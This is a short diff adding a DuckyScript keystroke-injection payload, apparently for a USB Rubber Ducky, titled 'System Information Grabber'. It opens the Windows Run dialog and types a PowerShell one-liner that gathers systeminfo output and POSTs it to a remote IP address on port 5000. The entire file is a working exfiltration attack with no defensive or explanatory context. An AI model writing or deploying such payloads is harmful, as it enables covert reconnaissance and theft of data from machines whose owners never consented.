@@ -1,0 +1,6 @@
+REM System Information Grabber
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -Command "(systeminfo | Out-String) | Invoke-RestMethod -Uri 'http://172.105.92.85:5000/upload' -Method POST -ContentType 'text/plain'"
+ENTER
